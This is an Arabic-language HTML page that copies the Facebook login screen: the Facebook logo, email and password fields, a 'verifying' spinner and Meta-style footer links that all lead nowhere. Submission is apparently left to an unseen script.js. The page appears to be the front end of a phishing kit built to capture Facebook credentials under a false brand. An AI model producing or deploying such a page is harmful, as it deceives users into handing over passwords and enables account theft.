<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
    </div>

    <div class="login-container">
        <div class="login-title">تسجيل الدخول إلى فيسبوك</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="password" placeholder="كلمة السر" required>
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <span> جاري التحقق...</span>
            </div>
            <button type="submit" class="login-button" id="submitBtn">تسجيل الدخول</button>
        </form>
        <div class="forgot-account">
            <a href="#">هل نسيت الحساب؟</a>
        </div>
        <div class="create-account">
            <button type="button" class="create-account-button">إنشاء حساب جديد</button>
        </div>
    </div>

    <div class="footer">
        <div class="languages">
            <a href="#">العربية</a>
            <a href="#">English (UK)</a>
            <a href="#">Français (France)</a>
            <a href="#">Español</a>
            <a href="#">Deutsch</a>
            <a href="#">Italiano</a>
            <a href="#">Português (Brasil)</a>
        </div>
        
        <div class="meta-links">
            <a href="#">تسجيل الدخول</a>
            <a href="#">Messenger</a>
            <a href="#">Marketplace</a>
            <a href="#">Meta Store</a>
            <a href="#">سياسة الخصوصية</a>
            <a href="#">مركز المساعدة</a>
            <a href="#">حول</a>
        </div>
        
        <div class="copyright">Meta © 2025</div>
    </div>

    <script src="script.js"></script>
</body>
</html>
